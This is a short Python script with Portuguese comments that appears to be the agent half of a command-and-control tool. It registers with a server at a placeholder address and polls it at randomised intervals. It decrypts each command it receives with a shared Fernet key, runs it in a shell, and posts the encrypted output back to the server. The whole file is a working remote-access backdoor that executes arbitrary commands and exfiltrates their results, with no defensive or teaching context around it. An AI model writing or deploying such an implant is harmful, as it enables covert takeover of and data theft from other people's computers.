import requests
import time
import subprocess
import random
from cryptography.fernet import Fernet

SERVER_URL = 'http://IP_DO_SERVER:5000'
key = b'your_shared_key_here'  # tem de ser a mesma do server.py

# Registro
response = requests.post(f'{SERVER_URL}/register')
agent_id = response.json()['agent_id']

# poll infinita
while True:
    time.sleep(10 + random.randint(0, 20))
    headers = {'Agent-id': agent_id}
    resp = requests.get(f'{SERVER_URL}/getcommand', headers=headers)
    if resp.json().get('command'):
        cmd = Fernet(key).decrypt(resp.json()['command'].encode()).decode()
        result = subprocess.check_output(cmd, shell=True).decode()
        enc_result = Fernet(key).encrypt(result.encode()).decode()
        requests.post(
            f'{SERVER_URL}/submit_result',
            json={'result': enc_result},
            headers=headers
        )
